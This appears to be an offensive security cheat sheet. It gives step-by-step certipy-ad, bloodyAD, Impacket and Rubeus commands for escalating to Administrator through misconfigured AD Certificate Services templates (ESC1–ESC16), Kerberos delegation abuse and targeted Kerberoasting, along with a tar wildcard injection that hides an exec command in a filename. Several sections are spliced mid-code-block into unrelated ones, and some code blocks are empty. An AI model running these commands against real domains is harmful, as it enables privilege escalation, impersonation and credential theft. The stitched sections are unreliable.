### ESC1: Misconfigured Certificate Templates

#### Prerequisistes

- The Enterprise CA grants low-privileged users enrollment rights
- Manager approval is disabled
	- `mspki-enrollment-flag` attribute needs to be set to `0x00000000`
- No authorized signatures are required
	- `msPKI-RA-Signature` attribute needs to be set to `0x00000000`
- An overly permissive certificate template security descriptor grants certificate enrollment rights to low-privileged users
- The certificate template defines EKUs that enable authentication
	- `mspki-certificate-application-policy` attribute needs to contain at least one of the following: `Client Authentication (1.3.6.1.5.5.7.3.2)`, `PKINIT Client Authentication (1.3.6.1.5.2.3.4)`, `Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2)`, `Any Purpose (OID 2.5.29.37.0)` or `no EKU (SubCA)`
- The certificate template allows requesters to specify a `subjectAltName (SAN)` in the `CSR`
	- `msPKI-Certificate-Name-Flag` attribute needs to be set to `0x00000001`

#### Usage

```console
$ certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>' -dns <RHOST>
```

```console
$ certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
```

### ESC2: Misconfigured Certificate Templates

#### Prerequisistes

- The Enterprise CA grants low-privileged users enrollment rights
- Manager approval is disabled
	- `mspki-enrollment-flag` attribute needs to be set to `0x00000000`
- No authorized signatures are required
	- `msPKI-RA-Signature` attribute needs to be set to `0x00000000`
- An overly permissive certificate template security descriptor grants certificate enrollment rights to low-privileged users
- The certificate template defines Any Purpose EKUs or no EKU

#### Usage

```console
$ certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template '<TEMPLATE>'
```

```console
$ certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
```

```console
$ certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
```

### ESC3: Enrollment Agent Templates

#### Prerequisistes

- The Enterprise CA grants low-privileged users enrollment rights
- Manager approval is disabled
	- `mspki-enrollment-flag` attribute needs to be set to `0x00000000`
- No authorized signatures are required
	- `msPKI-RA-Signature` attribute needs to be set to `0x00000000`
- An overly permissive certificate template security descriptor grants certificate enrollment rights to low-privileged users
- The certificate template defines the Certificate Request Agent EKU
	- The `Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1)` allows for requesting other certificate templates on behalf of other principals
- Enrollment agent restrictions are not implemented on the CA

#### Usage

```console
$ certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template '<TEMPLATE>'
```

```console
$ certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
```

```console
$ certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
```

### ESC4: Vulnerable Certificate Template Access Control

#### Description

`ESC4` is when a user has `write privileges` over a `certificate template`. This can for instance be abused to `overwrite` the `configuration` of the `certificate template` to make the template vulnerable to `ESC1`.

By default, Certipy will overwrite the configuration to make it vulnerable to `ESC1`.

We can specify the `-save-old` parameter to save the old configuration, which is useful for restoring the configuration afterwards.

#### Usage

```console
$ certipy-ad template -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -template '<TEMPLATE>' -save-old
$ certipy-ad template -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -template '<TEMPLATE>'
```

The certificate template is now vulnerable to the `ESC1` technique.

Therefore, we can now request a certificate based on the `ESC4` template and specify an `arbitrary SAN` with the `-upn` or `-dns` parameter.

```console
$ certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target <RHOST> -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>'
```

or

```console
$ certipy-ad req -ca '<CA>' -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <RHOST> -template '<TEMPLATE>' -target <RHOST> -upn 'Administrator@<DOMAIN>' -debug
```

```console
$ certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
```

##### Restore Configuration

```console
$ certipy-ad template -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -template '<TEMPLATE>' -configuration <TEMPLATE>.json
```

### ESC5: Vulnerable PKI Object Access Control

#### Description

A number of objects `outside` of `certificate templates` and the `certificate authority` itself can have a `security impact` on the entire `AD CS` system.

These possibilities include (but are not limited to):

- CA server’s AD computer object (i.e., compromise through RBCD)
- The CA server’s RPC/DCOM server
- Any descendant AD object or container in the container `CN=Public Key Services,CN=Services,CN=Configuration,DC=<COMPANY>,DC=<COM>` (e.g., the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, the Enrollment Services container, etc.)

### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2

#### Description

`ESC6` is when the `CA` specifies the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag. This flag allows the `enrollee` to specify an `arbitrary SAN` on `all certificates` despite a certificate template's configuration.

After the `patch` for the reported vulnerability `CVE-2022–26923`, this technique `no longer works alone`, but must be combined with `ESC10`.

The attack is the same as `ESC1`, except that you can `choose` any `certificate template` that permits `client authentication`. After the `May 2022` security updates, `new certificates` will have a securiy extension that `embeds` the requester's `objectSid` property. For `ESC1`, this property will be `reflected` from the `SAN` specified, but with `ESC6`, this property reflects the requester's `objectSid`, and not from the SAN. Notice that the `objectSid` changes `depending` on the requester.

As such, to abuse `ESC6`, the `environment` must be `vulnerable` to `ESC10 (Weak Certificate Mappings)`, where the `SAN` is preferred `over` the `new security extension`.

#### Usage

```console
$ certipy-ad find -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -vulnerable -stdout
```

```console
$ certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template User -upn 'Administrator@<DOMAIN>'
```

```console
$ certipy-ad req -ca '<CA>' -username 'Administrator@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template User -upn 'Administrator@<DOMAIN>'
```

```console
$ certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
```

### ESC7: Vulnerable Certificate Authority Access Control

#### Description

`ESC7` is when a user has the `Manage CA` or `Manage Certificates` access right on a CA. There are no public techniques that can abuse the `Manage Certificates` access right for domain privilege escalation, but it can be used it to issue or deny pending certificate requests.

The `Certified Pre-Owned whitepaper` mentions that this access right can be used to enable the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag to perform the `ESC6` attack, but this will `not have` any effect `until` the `CA service (CertSvc)` is `restarted`.

#### Alternative Technique by ly4k without restarting the CA service (CertSvc) service

##### Prerequisistes

- User must have the `Manage Certificates` access rights
- The certificate template `SubCA` must be enabled.

The technique relies on the fact that users with the `Manage CA` and `Manage Certificates` access right can `issue failed certificate requests`. The `SubCA` certificate `template` is `vulnerable` to `ESC1`, but only administrators can enroll in the template. Thus, a `user` can request to `enroll` in the `SubCA` - `which will be denied` - but then issued by the manager afterwards.

If you only have the `Manage CA` access right, you can grant yourself the `Manage Certificates` access right by adding your user as a new officer.

##### Usage

```console
$ certipy-ad ca -ca '<CA>' -add-officer '<USERNAME>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>'
```

```console
$ certipy-ad ca -ca '<CA>' -enable-template SubCA -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>'

> https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1?source=post_page-----fda4272fbd53--------------------------------

#### Prerequisites

- `Certificate template` specifies one or more `Issuance Policy OIDs` in its configuration
- In Active Directory's Configuration Naming Context (typically under `CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=...`), an `OID object` corresponding to the one in the certificate template can have its `msDS-OIDToGroupLink` attribute populated with the `distinguished name` (`DN`) of an `AD security group`
- `Authentication` using a `certificate` containing such an `Issuance Policy OID` so that the KDC can read this `OID` from the `certificate`
- `Group` linked (`msDS-OIDToGroupLink`) to the `OID`

#### Verification

```powershell
<#

Set the `dNSHostName` attribute of the victim principal to the name of the target's `X509SubjectOnly` mapping `SubjectName` identifier
3. Enroll a certificate in the affected certificate template as the victim principal
4. Authenticate as the target principal using the certificate

#### Usage

##### Scenario B: Target with X509RFC822 (email)

```console
$ python3 entry.py find -u '<USERNAME>@<DOMAIN>' -hashes ':<HASH>' -dc-ip <RHOST> -esc14 -vulnerable -stdout -debug
```

```powershell
PS C:\> Set-ADUser -Identity <USERNAME> -Add @{'altSecurityIdentities'='X509:<RFC822>foobar@domain.local'}
```

```console
$ bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object <USERNAME> mail -v foobar@domain.local
```

```console
$ certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -template '<TEMPLATE>'
```

```console
$ certipy-ad auth -pfx <FILE>.pfx -domain '<DOMAIN>' -username '<USERNAME>'
```

### ESC15: Arbitrary Application Policy Injection in V1 Templates (CVE-2024-49019 "EKUwu")

#### Prerequisites

- Unpatched `CA` missing relevant `security patches` (`November 2024`)
- Primarily affect `Version 1` templates that also have the "`Enrollee supplies subject`" (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) setting enabled

#### Usage

##### Scenario A: Direct Impersonation via Schannel (Injecting "Client Authentication" Application Policy)

```console
$ certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'WebServer' -upn 'Administrator@<DOMAIN>' -sid 'S-1-5-21-...-500' -application-policies 'Client Authentication'
```

```console
$ certipy-ad auth -pfx 'Administrator.pfx' -dc-ip '<RHOST>' -ldap-shell
```

##### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse (Injecting "Certificate Request Agent" Application Policy)

```console
$ certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'WebServer' -application-policies 'Certificate Request Agent'
```

```console
$ certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'User' -pfx '<FILE>.pfx' -on-behalf-of '<DOMAIN>\Administrator'
```

```console
$ certipy-ad auth -pfx 'Administrator.pfx' -dc-ip '<RHOST>'
```

### ESC16: Security Extension Disabled on CA (Globally)

#### Prerequisites

##### Scenario A: With UPN Manipulation (in Compatibility Mode - StrongCertificateBindingEnforcement = 1 or 0)

- Gobal configuration to disable `szOID_NTDS_CA_SECURITY_EXT` (`OID: 1.3.6.1.4.1.311.25.2`) security extension in all certificate issues
- Changeable account's `UPN` to match a target privileged account's `sAMAccountName`

##### Scenario B: Combined with ESC6 (CA allows SAN specification via request attributes)

- Unpatched `CA` missing relevant `security patches` (`May 2025 (KB5014754)`) or subsequent cumulative updates that include it

#### Usage

##### Scenario A: With UPN Manipulation (in Compatibility Mode - StrongCertificateBindingEnforcement = 1 or 0)

```console
$ certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -user '<USERNAME>' read
```

```console
$ certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -upn 'Administrator' -user '<USERNAME>' update
```

```console
$ certipy-ad shadow -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -account '<USERNAME>' auto
```

```console
$ export KRB5CCNAME=<USERNAME>.ccache
```

```console
$ certipy-ad req -k -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'User'
```

Revert the `UPN` to the original `user`.

```console
$ certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -upn 'Administrator' -user '<USERNAME>' update
```

```console
$ certipy-ad auth -pfx 'Administrator.pfx' -username '<USERNAME>' -domain '<DOMAIN>' -dc-ip '<RHOST>'
```

##### Scenario B: Combined with ESC6 (CA allows SAN specification via request attributes)

```console
$ certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -user '<USERNAME>' read
```

```console
$ certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -upn '<USERNAME>' -user '<USERNAME>' update
```

```console
$ certipy-ad req -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'User' -upn 'Administrator@<DOMAIN>' -sid 'S-1-5-21-...-500'
```

Revert the `UPN` to the original `user`.

```console
$ certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -upn '<USERNAME>' -user '<USERNAME>' update
```

```console
$ certipy-ad auth -pfx 'Administrator.pfx' -username '<USERNAME>' -domain '<DOMAIN>' -dc-ip '<RHOST>'
```

### Error Handling

#### Fixing Username or domain is not specified, and identity information was not found in the certificate Error

```console
$ certipy-ad auth -pfx 'Administrator.pfx' -username 'Administrator' -domain '<DOMAIN>' -dc-ip '<RHOST>'
```

#### Fixing Object SID mismatch between certificate and user 'Administrator' Error

```console
$ impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
```

```console
$ certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>' -sid 'S-1-5-21-2983547755-698260136-4283918172-500'
```

#### Fixing Got error while requesting certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template Error

```console
$ certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>' -key-size '4096'
```

| Impacket Module | Description |
| --- | --- |
| impacket-addcomputer | It will add a computer account to the domain and set its password. The following command will create a new computer over the SMB by specifying the SAMR method. |
| impacket-atexec | It executes a command on the target machine through the Task Scheduler service and returns the output of the executed command. |
| impacket-dcomexec | A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. Currently supports MMC20.Application, ShellWindows and ShellBrowserWindow objects. |
| impacket-dpapi | Allows decrypting vaults, credentials and masterkeys protected by DPAPI. |
| impacket-esentutl | An Extensible Storage Engine format implementation. Allows dumping catalog, pages and tables of ESE databases (e.g. NTDS.dit). |
| impacket-exchanger | A tool for connecting to MS Exchange via RPC over HTTP v2. |
| impacket-findDelegation | Simple script to quickly list all delegation relationships (unconstrained, constrained, resource-based constrained) in an AD environment. |
| impacket-Get-GPPPassword | This example extracts and decrypts Group Policy Preferences passwords using streams for treating files instead of mounting shares. Additionally, it can parse GPP XML files offline. |
| impacket-GetADUsers | This script will gather data about the domain’s users and their corresponding email addresses. It will also include some extra information about last logon and last password set attributes. |
| impacket-getArch | This script will connect against a target (or list of targets) machine/s and gather the OS architecture type installed by (ab)using a documented MSRPC feature. |
| impacket-GetNPUsers | This example will attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ set (UF_DONT_REQUIRE_PREAUTH). Output is compatible with JtR. |
| impacket-getPac | This script will get the PAC (Privilege Attribute Certificate) structure of the specified target user just having a normal authenticated user credentials. It does so by using a mix of [MS-SFU]’s S4USelf + User to User Kerberos Authentication. |
| impacket-getST | Given a password, hash, aesKey or TGT in ccache, this script will request a Service Ticket and save it as ccache. If the account has constrained delegation (with protocol transition) privileges you will be able to use the -impersonate switch to request the ticket on behalf another user. |
| impacket-getTGT | Given a password, hash or aesKey, this script will request a TGT and save it as ccache. |
| impacket-GetUserSPNs | This example will try to find and fetch Service Principal Names that are associated with normal user accounts. Output is compatible with JtR and HashCat. |
| impacket-goldenPac | Exploit for MS14-068. Saves the golden ticket and also launches a PSEXEC session at the target. |
| impacket-karmaSMB | A SMB Server that answers specific file contents regardless of the SMB share and pathname specified. |
| impacket-keylistattack | This example implements the Kerberos Key List attack to dump credentials abusing RODCs and Azure AD Kerberos Servers. |
| impacket-kintercept | A tool for intercepting krb5 connections and for testing KDC handling S4U2Self with unkeyed checksum. |
| impacket-lookupsid | A Windows SID brute forcer example through [MS-LSAT] MSRPC Interface, aiming at finding remote users/groups. |
| impacket-machine_role | This script retrieves a host's role along with its primary domain details. |
| impacket-mimikatz | Mini shell to control a remote mimikatz RPC server developed by @gentilkiwi. |
| impacket-mqtt_check | Simple MQTT example aimed at playing with different login options. Can be converted into a account/password brute forcer quite easily. |
| impacket-mssqlclient | Alternative method to execute cmd's on MSSQL. |
| impacket-mssqlinstance | Retrieves the instances names from the target host. |
| impacket-netview | Gets a list of the sessions opened at the remote hosts and keep track of them looping over the hosts found and keeping track of who logged in/out from remote servers. |
| impacket-nmapAnswerMachine | n/a |
| impacket-ntfs-read | NTFS format implementation. This script provides a mini shell for browsing and extracting an NTFS volume, including hidden/locked contents. |
| impacket-ntlmrelayx | This script performs NTLM Relay Attacks, setting an SMB and HTTP Server and relaying credentials to many different protocols (SMB, HTTP, MSSQL, LDAP, IMAP, POP3, etc.). The script can be used with predefined attacks that can be triggered when a connection is relayed (e.g. create a user through LDAP) or can be executed in SOCKS mode. In this mode, for every connection relayed, it will be available to be used later on multiple times through a SOCKS proxy. |
| impacket-ping | Simple ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host. If the remote host is up, it should reply to the echo probe with an echo-reply packet. |
| impacket-ping6 | Simple IPv6 ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host. |
| impacket-psexec | PSEXEC like functionality example using RemComSvc (https://github.com/kavika13/RemCom) |
| impacket-raiseChild | This script implements a child-domain to forest privilege escalation by (ab)using the concept of Golden Tickets and ExtraSids. |
| impacket-rbcd | Example script for handling the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer. |
| impacket-rdp_check | [MS-RDPBCGR] and [MS-CREDSSP] partial implementation just to reach CredSSP auth. This example tests whether an account is valid on the target host. |
| impacket-reg | Remote registry manipulation tool through the [MS-RRP] MSRPC Interface. The idea is to provide similar functionality as the REG.EXE Windows utility. |
| impacket-registry-read | A Windows Registry file format implementation. It allows to parse offline registry hives. |
| impacket-rpcdump | This script will dump the list of RPC endpoints and string bindings registered at the target. It will also try to match them with a list of well known endpoints. |
| impacket-rpcmap | Scan for listening DCE/RPC interfaces. This binds to the MGMT interface and gets a list of interface UUIDs. If the MGMT interface is not available, it takes a list of interface UUIDs seen in the wild and tries to bind to each interface. |
| impacket-sambaPipe | This script will exploit CVE-2017-7494, uploading and executing the shared library specified by the user through the -so parameter. |
| impacket-samrdump | An application that communicates with the Security Account Manager Remote interface from the MSRPC suite. It lists system user accounts, available resource shares and other sensitive information exported through this service. |
| impacket-secretsdump | Performs various techniques to dump secrets from the remote machine without executing any agent there. For SAM and LSA Secrets (including cached creds) we try to read as much as we can from the registry and then we save the hives in the target system (%SYSTEMROOT%\Temp directory) and read the rest of the data from there. For DIT files, we dump NTLM hashes, Plaintext credentials (if available) and Kerberos keys using the DL_DRSGetNCChanges() method. It can also dump NTDS.dit via vssadmin executed with the smbexec/wmiexec approach. The script initiates the services required for its working if they are not available (e.g. Remote Registry, even if it is disabled). After the work is done, things are restored to the original state. |
| impacket-services | This script can be used to manipulate Windows services through the [MS-SCMR] MSRPC Interface. It supports start, stop, delete, status, config, list, create and change. |
| impacket-smbclient | A generic SMB client that will let you list shares and files, rename, upload and download files and create and delete directories, all using either username and password or username and hashes combination. It’s an excellent example to see how to use impacket.smb in action. |
| impacket-smbexec | A similar approach to PSEXEC w/o using RemComSvc. This implementation goes one step further, instantiating a local smbserver to receive the output of the commands. This is useful in the situation where the target machine does NOT have a writeable share available. |
| impacket-smbpasswd | This script is an alternative to smbpasswd tool and intended to be used for changing expired passwords remotely over SMB (MSRPC-SAMR). |
| impacket-smbrelayx | Exploit for CVE-2015-0005 using a SMB Relay Attack. If the target system is enforcing signing and a machine account was provided, the module will try to gather the SMB session key through NETLOGON. |
| impacket-smbserver | A Python implementation of an SMB server. Allows to quickly set up shares and user accounts. |
| impacket-sniff | Simple packet sniffer that uses the pcapy library to listen for packets in # transit over the specified interface. |
| impacket-sniffer | Simple packet sniffer that uses a raw socket to listen for packets in transit corresponding to the specified protocols. |
| impacket-split | n/a |
| impacket-ticketConverter | This script will convert kirbi files, commonly used by mimikatz, into ccache files used by Impacket, and vice versa. |
| impacket-ticketer | This script will create Golden/Silver tickets from scratch or based on a template (legally requested from the KDC) allowing you to customize some of the parameters set inside the PAC_LOGON_INFO structure, in particular the groups, ExtraSids, duration, etc. |
| impacket-wmiexec | A semi-interactive shell, used through Windows Management Instrumentation. It does not require to install any service/agent at the target server. Runs as Administrator. Highly stealthy. |
| impacket-wmipersist | This script creates/removes a WMI Event Consumer/Filter and link between both to execute Visual Basic based on the WQL filter or timer specified. |
| impacket-wmiquery | It allows to issue WQL queries and get description of WMI objects at the target system (e.g. select name from win32_account). |

## Kerberos

### Authentication

> https://csforza.gitbook.io/pentesting-articles-and-notes/windows/active-directory/kerberos-authentication

If a user wants to obtain access to resources within a Active Directory network, he must obtain a ticket through a `6-step` process.

1. User sends a request to the `Kerberos Distribution Center (KDC)` with his password hash and a timestamp. (AS-REQ)
2. If the `password hash` of the user matches that for the user on the `KDC`, the user receives a `Ticket Granting Ticket` encrypted and signed by the `krbtgt` account. (AS-REP)
3. The `TGT`, including the `krbtgt hash`, is sent to the `KDC` or `DC` in order to recieve a `Kerberos Service Ticket (TGS)`. (TGS-REQ)
4. User then receives a `TGS` encrypted with the `hash` of the service account he wishes to access. (TGS-REP)
5. User then connects to the server and attempts to use the service he sent the `initial request` for with the `TGS` included. (AP-REQ)
6. User gains access and mutual authentication is given between the server and client if necessary (AP-REP).

#### Constrained Delegation

> https://csforza.gitbook.io/pentesting-articles-and-notes/windows/active-directory/privilege-escalation/constrained-delegation

> https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation

- `SeEnableDelegationPrivilege` needs to be granted.
- `Constrained Delegation` limits the services to which a service can access on behalf of a user.
- This service account must still be `trusted` to `delegate`.
- The user does `not authenticate` with `Kerberos` to the `constrained service`.
- Instead of authenticating to the `KDC` first, like in a regular Kerberos ticket request, the user authenticates `directly to the service`.
- Once the user authenticates to the service, the service then requests a `forwardable TGT` to the `KDC` without the user's password included.
- The `KDC` checks the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` attribute on the service and whether or not the user's account is blocked.
- If everything checks out a ticket is returned.
- Ticket gets `passed back` to the `KDC` and a `TGS ticket` is requested to the `second service`.
- `KDC` checks the `msDS-AllowedToDelegateTo` field on the second service and if it is listed, then an `access ticket` is granted.
- `TGS` gets sent to the next service and the user now can authenticate to it.

The `Service for User (S4U)` extension is used to aid the impersonation process when `Constrained Delegation` is used. The extension has two extensions within it:

- `Service for User to Self (S4U2Self)`: This allows a service to obtain a `forwardable TGS` to itself on the user's behalf with the `User Principal Name` supplied. No password is included.
- `Service for User to Proxy (S4U2proxy)`: This allows the service to `obtain` the required `TGS` on the user's behalf to the second service the user needs to connect to. This second service will have the `msDS-AllowedToDelegateTo` attribute given to it. User tokens can be forwarded to those `SPN's` which have this attribute given.

Delegation occurs not only for the specified service, but also for ANY service running under the account that is running the service.

##### TrustedToAuthForDelegation

```cmd
PS C:\> Set-ADComputer -Identity <RHOST> -Add @{'msDS-AllowedToDelegateTo'=@('cifs/<RHOST>')}
```

or

```cmd
PS C:\> Set-ADObject -Identity "CN=<RHOST>,CN=COMPUTERS,DC=<DOMAIN>,DC=<DOMAIN>" -Add @{"msDS-AllowedToDelegateTo"="ldap/<RHOST>"}
```

```cmd
PS C:\> Set-ADAccountControl -Identity "<RHOST>$" -TrustedToAuthForDelegation $True
```

```console
$ impacket-findDelegation '<DOMAIN>'/'<RHOST>$:<PASSWORD>'
```

```console
$ impacket-getST '<DOMAIN>'/'<RHOST>$:<PASSWORD>' -spn cifs/<RHOST> -impersonate <RHOST>
```

or

```console

```

#### Unconstrained Delegation

> https://csforza.gitbook.io/pentesting-articles-and-notes/windows/active-directory/privilege-escalation/unconstrained-delegation

> https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation

Kerberos Delegation allows for users to access resources on another server via a service that the user has access to. The service the user is connected to impersonates that user by resusing his credentials which then allows the user to gain access to that server.

- When `Unconstrained Delegation` is enabled, the user's `TGT` is sent along with the `TGS` to the first hop service. That `TGT` gets stored in the server's `LSASS` which allows the service to take it out and delegate with it if necessary.
- Accounts or services with `Unconstrained Delegation` can be escalated to an account with higher privileges, if a Domain Admin or a higher privileged user connecting to that machine.
- The `TGT` can be extracted and the ticket `reused`.

#### Resource-based Constrained Delegation (RBCD)

> https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution

> https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/

> https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview

- In `unconstrained` and `constrained Kerberos delegation`, a `computer/user` is told what resources it can delegate authentications to.
- In `Resource-based Kerberos Delegation`, computers (resources) specify who they `trust` and who can `delegate` authentications to them.
- By supporting constrained delegation across domains, `services` can be `configured` to use `constrained delegation` to `authenticate` to `servers` in other domains rather than using unconstrained delegation.
- This provides `authentication support` for across domain service solutions by using an existing Kerberos infrastructure `without` needing to trust `front-end services` to delegate to any service.

##### Prerequisites

- Populate the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute with a computer account that will be controlled.
- Know a `SPN` set on the object to gain access.
- Create a new `computer account` using PowerMad (allowed due to the default MachineAccountQuota value).
- Leverage Rubeus to abuse `Resource-Based Constrained Delegation`.

##### AddAllowedToAct

```cmd
PS C:\> Set-ADComputer -Identity <RHOST> -PrincipalsAllowedToDelegateToAccount <RHOST>$
```

```console
$ impacket-getST '<DOMAIN>/<RHOST>$:<PASSWORD>' -k -spn 'cifs/<RHOST>' -impersonate <USERNAME>
```

```console
$ export KRB5CCNAME=<FILE>.ccache
```

```console
$ impacket-smbexec -k -no-pass '<DOMAIN>/<USERNAME>@<RHOST>'
```

##### SPN-less User

#### Kerberoasting

> https://csforza.gitbook.io/pentesting-articles-and-notes/windows/active-directory/privilege-escalation/kerberoasting

> https://xedex.gitbook.io/internalpentest/internal-pentest/active-directory/post-compromise-attacks/kerberoasting

- All user accounts that have `Service Principal Names (SPN's)` set can be kerberoasted.
- Relatively silent technique because it leaves only one `4769 ID event` on the log.

#### AS-REP Roasting

> https://csforza.gitbook.io/pentesting-articles-and-notes/windows/active-directory/privilege-escalation/as-rep-roasting

> https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat

ASPREPRoast is about retrieving crackable hashes from `KRB5 AS-REP` responses for users without `kerberoast preauthentication` enabled. This isn't as useful as Kerberoasting, as accounts have to have `DONT_REQ_PREAUTH` explicitly set for them to be vulnerable and you are still reliant upon weak password complexity for the attack to work.

- `AS-REP roasting` is a technique that allows retrieving password hashes for users that have `Do not require Kerberos preauthentication` property selected.
- Those hashes can then be cracked offline.

#### Targeted Kerberoast

> https://github.com/ShutdownRepo/targetedKerberoast

##### Enumeration

```cmd
C:\> setspn.exe -T <DOMAIN> -Q */*
```

###### bloodyAD Example

```console
$ bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p ':381b793bde43ea263ae34bb1g9cd38f5' get writable
```

##### Set Service Principal Name (SPN)

```cmd
C:\> setspn.exe -T <DOMAIN> -S "HTTP/<RHOST>" <RHOST>
```

or

```cmd
PS C:\> Set-DomainObject -Identity "<RHOST>" -Set @{ServicePrincipalName='http/<RHOST>'}
```

###### PowerView Example

```cmd
PS C:\> Set-DomainObject -Identity <USERNAME> -SET @{serviceprincipalname='nonexistent/foobar'}
```

##### Execution

```cmd
PS C:\> .\Rubeus.exe dump /nowrap
$ base64 -d <USERNAME>.kirbi.b64 > <USERNAME>.kirbi
$ impacket-ticketConverter <USERNAME>.kirbi <USERNAME>.ccache
$ export KRB5CCNAME=`realpath <USERNAME>.ccache`
$ targetedKerberoast.py -k --no-pass -d '<DOMAIN>' --dc-ip <RHOST> --request-user '<USERNAME>'
```

#### Silver, Golden and Diamond Tickets

- Silver Ticket is a forged service authentication ticket (Service Principal Name (SPN) and Machine Account Keys (Hash in RC4 or AES) needed). Silver Tickets do not touch the Domain Controller (DC).
- Golden Ticket is a Ticket Granting Ticket (TGT) and completely forged offline (KRBTGT Account Hash needed).
- Diamond Ticket is essentially a Golden Ticket but requested from a Domain Controller (DC).

### Ticket Conversion

With the command `touch -- --checkpoint=1` will be a file created. Why? Because the `--` behind the command `touch` is telling touch, that there's option to be wait for. 
Instead of an option, it creates a file, named `--checkpoint=1`.

```console
$ touch -- --checkpoint=1
```

or

```console
$ touch ./--checkpoint=1
```

So after creating the `--checkpoint=1` file, i created another file, which executes a shell script.

```console
$ touch -- '--checkpoint-action=exec=sh shell.sh'
```

or 

```console
$ touch ./--checkpoint-action=exec=<FILE>
```

To delete a misconfigured file, put a `./` in front of it.

```console
$ rm ./'--checkpoint-action=exec=python script.sh'
```

### Hashes

> https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4

> https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

- LM Hashes are deprecated and so there are replaced by an empty string (aad3b435b51404eeaad3b435b51404ee).
